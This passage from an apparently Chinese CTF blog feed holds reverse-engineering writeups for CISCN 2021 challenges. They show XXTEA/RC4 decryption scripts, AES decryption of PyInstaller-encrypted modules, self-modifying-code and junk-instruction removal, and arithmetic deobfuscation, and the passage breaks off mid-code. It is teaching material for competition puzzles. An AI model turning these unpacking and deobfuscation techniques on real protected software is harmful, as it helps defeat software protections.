rounds, e;  </span><br><span class="line">        rounds = <span class="number">6</span> + <span class="number">52</span>/n;  <span class="comment">//12        52/6 = 8    n</span></span><br><span class="line">        sum = rounds*DELTA;  </span><br><span class="line">        y = v[<span class="number">0</span>];  </span><br><span class="line">        <span class="keyword">do</span> &#123;  </span><br><span class="line">            e = (sum &gt;&gt; <span class="number">2</span>) &amp; <span class="number">3</span>;  </span><br><span class="line">            <span class="keyword">for</span> (p=n<span class="number">-1</span>; p&gt;<span class="number">0</span>; p--) &#123;  </span><br><span class="line">                z = v[p<span class="number">-1</span>];  </span><br><span class="line">                y = v[p] -= MX;  </span><br><span class="line">            &#125;  </span><br><span class="line">            z = v[n<span class="number">-1</span>];  </span><br><span class="line">            y = v[<span class="number">0</span>] -= MX;  </span><br><span class="line">            sum -= DELTA;  </span><br><span class="line">        &#125;  </span><br><span class="line">        <span class="keyword">while</span> (--rounds);  </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">uint32_t</span> v[<span class="number">9</span>] = &#123;<span class="number">0x68E5973E</span>, <span class="number">0x0C20C7367</span>,</span><br><span class="line">    <span class="number">0x98AFD41B</span>, <span class="number">0xFE4B9DE2</span>,</span><br><span class="line">    <span class="number">0x1A5B60B</span>, <span class="number">0x3D36D646</span>,</span><br><span class="line">    <span class="number">0xDBCC7BAF</span>, <span class="number">0xA0414F00</span>,</span><br><span class="line">    <span class="number">0x762CE71A</span></span><br><span class="line">    &#125;;</span><br><span class="line">    <span class="keyword">uint32_t</span> <span class="keyword">const</span> k[<span class="number">4</span>] = &#123;<span class="number">0x1</span>,<span class="number">0x10</span>,<span class="number">0x100</span>,<span class="number">0x1000</span>&#125;;</span><br><span class="line">    <span class="keyword">int</span> n = <span class="number">9</span>;</span><br><span class="line">    btea(v,n,k);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;解密后的数据：0x%08x 0x%08x 0x%08x 0x%08x 0x%08x 0x%08x 0x%08x 0x%08x %08x\n&quot;</span>,v[<span class="number">0</span>],v[<span class="number">1</span>],v[<span class="number">2</span>],v[<span class="number">3</span>],v[<span class="number">4</span>],v[<span class="number">5</span>],v[<span class="number">6</span>],v[<span class="number">7</span>],v[<span class="number">8</span>]); </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>然后再接一个RC4</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">__rc4_init</span>(<span class="params">key</span>):</span></span><br><span class="line">    keylength = <span class="built_in">len</span>(key)</span><br><span class="line">    S = <span class="built_in">list</span>(<span class="built_in">range</span>(<span class="number">256</span>))</span><br><span class="line">    j = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">256</span>):</span><br><span class="line">        j = (j + S[i] + <span class="built_in">int</span>(key[i % keylength])) % <span class="number">256</span></span><br><span class="line">        S[i], S[j] = S[j], S[i]</span><br><span class="line">    <span class="keyword">return</span> S</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">rc4_crypt</span>(<span class="params">key, data</span>):</span></span><br><span class="line">    S = __rc4_init(key)</span><br><span class="line">    i = j = <span class="number">0</span></span><br><span class="line">    result = <span class="string">b&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> a <span class="keyword">in</span> data:</span><br><span class="line">        i = (i + <span class="number">1</span>) % <span class="number">256</span></span><br><span class="line">        j = (j + S[i]) % <span class="number">256</span></span><br><span class="line">        S[i], S[j] = S[j], S[i]</span><br><span class="line">        k = (a ^ S[(S[i] + S[j]) % <span class="number">256</span>]).to_bytes(<span class="number">1</span>, <span class="string">&#x27;big&#x27;</span>)</span><br><span class="line">        <span class="built_in">print</span> (<span class="built_in">hex</span>(S[(S[i] + S[j]) % <span class="number">256</span>]))</span><br><span class="line">        result += k</span><br><span class="line">    <span class="keyword">return</span> result</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    <span class="keyword">from</span> libnum <span class="keyword">import</span> n2s, s2n</span><br><span class="line">    key = <span class="string">b&#x27;\x01\x00\x00\x00\x10\x00\x00\x00\x00\x01\x00\x00\x00\x10\x00\x00&#x27;</span></span><br><span class="line">    data = n2s(<span class="number">0x5604b0d49c634d3096cec00593be3b82524b16b28a33b74d6d7b9950c2b10c12e1840a93</span>)</span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">convert</span>(<span class="params">k</span>):</span></span><br><span class="line">        ret = []</span><br><span class="line">        <span class="keyword">while</span> k &gt; <span class="number">0</span>:    </span><br><span class="line">            ret.append(k &amp; <span class="number">0xff</span>)</span><br><span class="line">            k &gt;&gt;= <span class="number">8</span></span><br><span class="line">        <span class="keyword">return</span> ret[::<span class="number">-1</span>]</span><br><span class="line">    result_rc4 = rc4_crypt(key,data)</span><br><span class="line">    print(result_rc4)</span><br></pre></td></tr></table></figure><p>注意一下大小端就行</p>]]></content>
    
    
    <summary type="html">&lt;ul&gt;
&lt;li&gt;RE1：迷宫&lt;/li&gt;
&lt;li&gt;RE2：so层&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;最后一个好像是php？告辞&lt;/p&gt;</summary>
    
    
    
    <category term="CTF" scheme="https://s0uthwood.github.io/categories/CTF/"/>
    
    <category term="Reverse" scheme="https://s0uthwood.github.io/categories/CTF/Reverse/"/>
    
    
    <category term="CTF" scheme="https://s0uthwood.github.io/tags/CTF/"/>
    
    <category term="Reverse" scheme="https://s0uthwood.github.io/tags/Reverse/"/>
    
  </entry>
  
  <entry>
    <title>CISCN-N 2021 RE Writeup</title>
    <link href="https://s0uthwood.github.io/2021/06/22/CISCN-N-2021-RE-Writeup/"/>
    <id>https://s0uthwood.github.io/2021/06/22/CISCN-N-2021-RE-Writeup/</id>
    <published>2021-06-22T15:25:43.000Z</published>
    <updated>2021-07-22T06:24:53.472Z</updated>
    
    <content type="html"><![CDATA[<p>题目质量很高，终于补完了</p><ul><li>imnotavirus</li><li>内卷</li><li>vs</li></ul><a id="more"></a><h1 id="imnotavirus"><a href="#imnotavirus" class="headerlink" title="imnotavirus"></a>imnotavirus</h1><p>解exe，解密pyc</p><p>利用解密后的pyc，找到注入的shellcode，用ida解smc，最后解密</p><p>比赛的时候还被迫阅读了一下pyinstaller的源码，收获很大</p><h2 id="解exe"><a href="#解exe" class="headerlink" title="解exe"></a>解exe</h2><p>看到附件给了个pyinstaller，猜测是python逆向</p><p>先ida看一眼，有upx壳，自动脱壳，再用exeinfo确认了一下是python逆向，pyinstxtractor.py解包（之前V&amp;N2021就吃了这个亏）</p><h2 id="解pyc"><a href="#解pyc" class="headerlink" title="解pyc"></a>解pyc</h2><p>解包时提示被加密了</p><p>取struct头作为标准头，用pycdc还原出main.py，发现调用了sign</p><p>去PYZ00文件夹看一下，发现被加密了，看一下目录，发现pyimod和比一般情况多了一些东西，把这些都解开看一下，有一个key文件</p><p>同时发现archive中有一个Cipher类，但是pycdc缺少指令，无法全部还原，考虑看一下pycdas解出来的字节码</p><p>字节码中有个对pyinstaller源码的引用，直接去文件夹里面看，发现能解密出来的部分完全一致</p><p>照着源码中的方法解密sign</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> key <span class="keyword">import</span> key</span><br><span class="line"><span class="keyword">import</span> tinyaes</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span> (key)</span><br><span class="line"></span><br><span class="line">f = <span class="built_in">open</span>(<span class="string">&#x27;./PYZ-00.pyz_extracted/sign.pyc.encrypted&#x27;</span>, <span class="string">&#x27;rb&#x27;</span>)</span><br><span class="line"></span><br><span class="line">data = f.read()</span><br><span class="line"></span><br><span class="line">cipher = tinyaes.AES(key.encode(), data[:<span class="number">16</span>])</span><br><span class="line">output = cipher.CTR_xcrypt_buffer(data[<span class="number">16</span>:])</span><br><span class="line"></span><br><span class="line">f.close()</span><br><span class="line"><span class="keyword">import</span> zlib</span><br><span class="line">output = zlib.decompress(output)</span><br><span class="line"></span><br><span class="line">f = <span class="built_in">open</span>(<span class="string">&#x27;./sign.pyc&#x27;</span>, <span class="string">&#x27;wb&#x27;</span>)</span><br><span class="line">f.write(output)</span><br></pre></td></tr></table></figure><h2 id="解密"><a href="#解密" class="headerlink" title="解密"></a>解密</h2><p>解出sign后看到有三个base64，其中两个是执行的语句，此外大部分语句涉及到了内存</p><p>另外一个base解出来是乱码，用字节码辅助恢复函数（其实特征已经很明显了），发现进行了rc4加密，直接打印出解密结果，将结果写入文件，用ida查看</p><p>发现smc</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">        mov     eax, 41178Bh</span><br><span class="line">        mov     ecx, 411802h</span><br><span class="line">        sub     ecx, eax</span><br><span class="line">loc_2A:</span><br><span class="line">        mov     ebx, [rax]</span><br><span class="line">        xor     ebx, 77h</span><br><span class="line">        mov     [rax], ebx</span><br><span class="line">        loop    loc_2A</span><br></pre></td></tr></table></figure><p>解出来后尝试恢复了一下函数，结果很丑…只能和汇编比较着进行分析了（好像只要把00 patch一下就可以反编译了）</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">seg000:000000000000007E loc_7E:                                 ; CODE XREF: sub_0+73↑j</span><br><span class="line">seg000:000000000000007E                 mov     eax, [rbp+var_20]</span><br><span class="line">seg000:0000000000000081                 cmp     eax, [rbp+var_8]</span><br><span class="line">seg000:0000000000000084                 jge     short loc_B2</span><br><span class="line">seg000:0000000000000086                 mov     eax, [rbp+8]</span><br><span class="line">seg000:0000000000000089                 add     eax, [rbp+var_20]</span><br><span class="line">seg000:000000000000008C                 movsx   ecx, byte ptr [rax]</span><br><span class="line">seg000:000000000000008F                 xor     ecx, 13h</span><br><span class="line">seg000:0000000000000092                 mov     edx, [rbp+8]</span><br><span class="line">seg000:0000000000000095                 add     edx, [rbp+var_20]</span><br><span class="line">seg000:0000000000000098                 mov     [rdx], cl</span><br><span class="line">seg000:000000000000009A                 mov     eax, [rbp+8]</span><br><span class="line">seg000:000000000000009D                 add     eax, [rbp+var_20]</span><br><span class="line">seg000:00000000000000A0                 movsx   ecx, byte ptr [rax+1]</span><br><span class="line">seg000:00000000000000A4                 xor     ecx, 37h</span><br><span class="line">seg000:00000000000000A7                 mov     edx, [rbp+8]</span><br><span class="line">seg000:00000000000000AA                 add     edx, [rbp+var_20]</span><br><span class="line">seg000:00000000000000AD                 mov     [rdx+1], cl</span><br><span class="line">seg000:00000000000000B0                 jmp     short loc_75</span><br></pre></td></tr></table></figure><p>发现是两两一组进行加密，分别异或0x13和0x37</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(cipher)):</span><br><span class="line"><span class="meta">... </span>    <span class="keyword">if</span> i % <span class="number">2</span> == <span class="number">0</span>:</span><br><span class="line"><span class="meta">... </span>            <span class="built_in">print</span> (<span class="built_in">chr</span>(cipher[i] ^ <span class="number">0x13</span>), end = <span class="string">&#x27;&#x27;</span>)</span><br><span class="line"><span class="meta">... </span>    <span class="keyword">else</span>:</span><br><span class="line"><span class="meta">... </span>            <span class="built_in">print</span> (<span class="built_in">chr</span>(cipher[i] ^ <span class="number">0x37</span>), end = <span class="string">&#x27;&#x27;</span>)</span><br><span class="line">...</span><br><span class="line"><span class="meta">@rey0ug0nn2$1gnth1s0r1tw1llb3y0ursurv1</span></span><br></pre></td></tr></table></figure><h1 id="内卷"><a href="#内卷" class="headerlink" title="内卷"></a>内卷</h1><p>这题是赛后边补边写的，所以废话略多</p><h2 id="花指令"><a href="#花指令" class="headerlink" title="花指令"></a>花指令</h2><p>搜索静态字符串能找到很多有用的字符串，但发现找不到引用</p><p>从start开始往里面翻一翻，发现有个一大片数据没有被解析出来，说明是个花指令，之前没见过这个花，简单记录一下</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">.text:00000001400016AB                 call    loc_1400016B3</span><br><span class="line">.text:00000001400016AB ; ---------------------------------------------------------------------------</span><br><span class="line">.text:00000001400016B0                 db 0E8h, 0EBh, 12h</span><br><span class="line">.text:00000001400016B3 ; ---------------------------------------------------------------------------</span><br><span class="line">.text:00000001400016B3</span><br><span class="line">.text:00000001400016B3 loc_1400016B3:                          ; CODE XREF: sub_1400015E2+C9↑j</span><br><span class="line">.text:00000001400016B3                 pop     rax             ; 取出栈顶数据</span><br><span class="line">.text:00000001400016B4                 add     rax, 1          ; 对其进行+1</span><br><span class="line">.text:00000001400016B8                 push    rax             ; 然后再压栈</span><br><span class="line">.text:00000001400016B9                 mov     rax, rsp</span><br><span class="line">.text:00000001400016BC                 xchg    rax, [rax]</span><br><span class="line">.text:00000001400016BF                 pop     rsp</span><br><span class="line">.text:00000001400016C0                 mov     [rsp+0], rax</span><br><span class="line">.text:00000001400016C4                 retn</span><br></pre></td></tr></table></figure><p>这个花长这样，所以 <code>Call loc_1400016B3</code> 的操作就是跳过 <code>E8</code>，把第一个<code>E8</code> patch成nop，发现<code>EB 12</code>就是跳到这个函数的后面，所以这条 <code>Call</code> 指令也可以Patch掉</p><p>还有一些长跳转，这个就直接按c转成指令就行</p><p>还有这个花</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">.text:0000000140006D12 loc_140006D12:                          ; CODE XREF: sub_1400015E2:loc_140006D12↑j</span><br><span class="line">.text:0000000140006D12                 jmp     short near ptr loc_140006D12+1</span><br></pre></td></tr></table></figure><p>把 <code>jmp</code> 指令的第一个字节patch了就行</p><p>花指令全部去掉之后发现结尾还有一部分没有反编译，这个比赛的时候没想出来怎么搞，不知道怎么回时，所以这题后面也就没有怎么做了</p><h2 id="运算简化"><a href="#运算简化" class="headerlink" title="运算简化"></a>运算简化</h2><p>比赛的时候想直接动调跳过这些运算的，结果看到和input还有关系，这就不好办了，尝试手动看一下这是什么运算，但也没啥想法</p><p>结果，晚上再看这道题的时候发现竟然看懂这个离谱运算了，啊啊啊啊啊好气啊</p><p>虽然有一堆函数，观察发现，通常每一个for循环中，包裹了两个while循环，但比赛的时候一直以for循环为单位在想代码的含义，晚上再看的时候才发现，每一个while循环才是一个单位函数</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">v1155 = ll;</span><br><span class="line">v1154 = <span class="number">1</span>i64;</span><br><span class="line">v1153 = ll &amp; <span class="number">1</span>;</span><br><span class="line">v1152 = ll ^ <span class="number">1</span>;</span><br><span class="line"><span class="keyword">while</span> ( v1153 ) &#123;</span><br><span class="line">    v1151 = v1152;</span><br><span class="line">    v1150 = <span class="number">2</span> * v1153;</span><br><span class="line">    v1153 = (<span class="number">2</span> * v1153) &amp; v1152;</span><br><span class="line">    v1152 ^= v1150;</span><br><span class="line">&#125;</span><br><span class="line">ll = v1152;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">v1041 = v1043;</span><br><span class="line">v1040 = v1045;</span><br><span class="line">v1039 = v1045 &amp; v1043;</span><br><span class="line">v1038 = v1045 ^ v1043; <span class="comment">// 运算简化方法：^ 换成 +，然后只保留这一行和最后一行</span></span><br><span class="line"><span class="keyword">while</span> ( v1039 ) &#123;</span><br><span class="line">    v1037 = v1038;</span><br><span class="line">    v1036 = <span class="number">2</span> * v1039;</span><br><span class="line">    v1039 = (<span class="number">2</span> * v1039) &amp; v1038;</span><br><span class="line">    v1038 ^= v1036;</span><br><span class="line">&#125;</span><br><span class="line">v1043 = v1038;</span><br></pre></td></tr></table></figure><p>简单地说，上面这段代码，最终的执行效果就是，<code>ll = ll + 1</code>，推广到下半部分，就是 <code>v1043 = v1038 = v1043 + v1045</code></p><p>好了，到此，就可以完成简化了，之后就变成了一个for循环里面一条自增的语句，所以就转换成了乘法</p><p>手动将这些代码整理好看一点，就长下面这样了</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> ( ii = <span class="number">0</span>; ii &lt; <span class="number">4</span>; ++i) &#123;</span><br><span class="line">    v1043 = ii * <span class="number">8</span>;</span><br><span class="line">    v1169 = &amp;list_a_v19[<span class="number">4</span> * ii];</span><br><span class="line">    input_1 = input + v1043;</span><br><span class="line">    input_2 = input + v1043 + <span class="number">4</span>;</span><br><span class="line">    sum = <span class="number">0</span>;</span><br><span class="line">    delta = <span class="number">3</span> * <span class="number">884811923</span>;</span><br><span class="line">    key0 = v1169[<span class="number">0</span>];</span><br><span class="line">    key1 = v1169[<span class="number">1</span>];</span><br><span class="line">    key2 = v1169[<span class="number">2</span>];</span><br><span class="line">    key3 = v1169[<span class="number">3</span>];</span><br><span class="line">    <span class="keyword">for</span> ( mm = <span class="number">0</span>; mm &lt;= <span class="number">0x1F</span>; mm++ ) &#123;</span><br><span class="line">        sum = delta + sum;</span><br><span class="line">        v1135 = <span class="number">16</span> * input_2;</span><br><span class="line">        v1118 = key0 + v1135;</span><br><span class="line">        v1112 = sum + input_2;</span><br><span class="line">        v1109 = input_2 &gt;&gt; <span class="number">5</span>;</span><br><span class="line">        v1106 = key1 + v1109;</span><br><span class="line">        input_1 += v1102;</span><br><span class="line">        v1095 = <span class="number">16</span> * v1100;</span><br><span class="line">        v1078 = key2 + v1095;</span><br><span class="line">        v1072 = sum + input_1;</span><br><span class="line">        v1069 = input_1 &gt;&gt; <span class="number">5</span>;</span><br><span class="line">        v1066 = key3 + v1069;</span><br><span class="line">        input_2 += v1062;</span><br><span class="line">    &#125;</span><br><span class="line">    v1170[<span class="number">0</span>] = input_1;</span><br><span class="line">    v1170[<span class="number">1</span>] = input_2;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>经过了一些手动处理，得到了上面的伪代码，显然就是TEA呗，第一关就这么过了</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">v510 = <span class="string">&quot;Th1nkMyfr1end&quot;</span>;</span><br><span class="line">v507 = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">char</span> v18[<span class="number">256</span>] = &#123;&#125;;</span><br><span class="line">v504 = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">for</span> ( i5 = <span class="number">0</span>; i5 &lt; <span class="number">256</span>; i5++ )</span><br><span class="line">&#123;</span><br><span class="line">  v17[i5] = i5;</span><br><span class="line">  v18[i5] = v510[i5 % <span class="number">13</span>];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> ( i5 = <span class="number">0</span>; i5 &lt; <span class="number">256</span>; i5++ )</span><br><span class="line">&#123;</span><br><span class="line">  v1 = v18[i5];</span><br><span class="line">  v2 = v17[i5];</span><br><span class="line">  v380 = v2 + v507;</span><br><span class="line">  v371 = v1 + v380;</span><br><span class="line">  v507 = v371 % <span class="number">256</span>;</span><br><span class="line">  v504 = v17[i5];</span><br><span class="line">  v17[i5] = v17[v507];</span><br><span class="line">  v17[v507] = v504;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">v511 = <span class="number">32</span>;</span><br><span class="line">v507 = <span class="number">0</span>;</span><br><span class="line">i5 = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">for</span> ( i17 = <span class="number">0</span>; v511 &gt; i17; i17++ )</span><br><span class="line">&#123;</span><br><span class="line">  i5 = (i5 + <span class="number">1</span>) % <span class="number">256</span>;           <span class="comment">// i = i + 1</span></span><br><span class="line">  v3 = v17[i5];                  <span class="comment">// S[i]</span></span><br><span class="line">  v507 = (v3 + v507) % <span class="number">256</span>;      <span class="comment">// j = (j + S[i]) % 256</span></span><br><span class="line">  v155 = v17[i5];</span><br><span class="line">  v17[i5] = v17[v507];</span><br><span class="line">  v17[v507] = v155;              <span class="comment">// S[i], S[j] = S[j], S[i]</span></span><br><span class="line">  v103 = v17[v507] + v17[i5];    <span class="comment">// S[i] + S[j]</span></span><br><span class="line">  input[i17] ^= v17[v103 % <span class="number">256</span>]; <span class="comment">// data ^= S[(S[i] + S[j]) % 256]</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>256的SBOX，且仅进行一次异或，果断RC4</p><p>中间见到了这样的东西</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">v100 = v103</span><br><span class="line">v98 = v103 / v120;</span><br><span class="line">v97 = v120;</span><br><span class="line">v96 = v97 * v98; <span class="comment">// 去除for循环后</span></span><br><span class="line">v506 = v100 - v96;</span><br></pre></td></tr></table></figure><p>$v103 - (v120 * (v103 / v120)) = v103 - (v103 - (v103 \% v120))$，显然就是取模运算了</p><p>随后是这个</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><span class="line">v1013 = (__int64)input;</span><br><span class="line">v1012 = (__int64)v20;</span><br><span class="line">v1011 = <span class="built_in">strlen</span>(input);</span><br><span class="line"><span class="keyword">for</span> ( i31 = <span class="number">0</span>; i31 &lt; <span class="number">65</span>; ++i31 )</span><br><span class="line">&#123;</span><br><span class="line">  v978 = <span class="number">3</span> * <span class="number">823</span> * <span class="number">5</span>; <span class="comment">// 12345</span></span><br><span class="line">  v948 = i31 * <span class="number">0x114514</span>;</span><br><span class="line">  v18[i31] = v948 % v978;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">while</span> ( v1011 &gt; <span class="number">2</span> )</span><br><span class="line">&#123;</span><br><span class="line">  v6 = *(_BYTE *)v1013 &gt;&gt; <span class="number">2</span>;</span><br><span class="line">  *(_BYTE *)v1012 = v18[v6 &amp; <span class="number">0x3f</span>];</span><br><span class="line">  v1012 += <span class="number">1</span>;</span><br><span class="line">  *(_BYTE *)v1012 = v18[(<span class="number">16</span> * (v1013[<span class="number">0</span>] &amp; <span class="number">3</span>)) | (v1013[<span class="number">1</span>] &gt;&gt; <span class="number">4</span>) &amp; <span class="number">0x0f</span>];</span><br><span class="line">  v1012 += <span class="number">1</span>;</span><br><span class="line">  v818 = <span class="number">4</span> * (v1013[<span class="number">1</span>] &amp; <span class="number">0x0f</span>);</span><br><span class="line">  v10 = *(_BYTE *)(v1013 + <span class="number">2</span>) &gt;&gt; <span class="number">6</span>;</span><br><span class="line">  v804 = <span class="number">2</span>;</span><br><span class="line">  v803 = <span class="number">1</span>;</span><br><span class="line">  v802 = <span class="number">0</span>;</span><br><span class="line">  v801 = <span class="number">3</span>;</span><br><span class="line">  *(_BYTE *)v1012 = v18[v818 | v10 &amp; <span class="number">3</span>];</span><br><span class="line">  v1012 += <span class="number">1</span>;</span><br><span class="line">  v11 = v1013[<span class="number">2</span>];</span><br><span class="line"></span><br><span class="line">  v5 = (<span class="keyword">unsigned</span> __int8)v18[v11 &amp; <span class="number">0x63</span>];</span><br><span class="line">  *(_BYTE *)v1012 = v5;</span><br><span class="line">  v1012 += <span class="number">1</span>;</span><br><span class="line">  v1011 = ~(~v1011 + <span class="number">3</span>); <span class="comment">// v1011 -= 3</span></span><br><span class="line">  v1013 += <span class="number">3</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> ( v1011 )</span><br><span class="line">&#123;</span><br><span class="line">  v12 = *(_BYTE *)v1013 &gt;&gt; <span class="number">2</span>;</span><br><span class="line">  *(_BYTE *)v1012 = v18[v12 &amp; <span class="number">0x3f</span>];</span><br><span class="line">  v1012++;</span><br><span class="line">  <span class="keyword">if</span> ( v1011 &lt;= <span class="number">1</span> ) &#123;</span><br><span class="line">    v16 = *(_BYTE *)v1013;</span><br><span class="line">    v640 = (v16 &amp; <span class="number">3</span>) &lt;&lt; <span class="number">4</span>;</span><br><span class="line">    *(_BYTE *)v1012 = 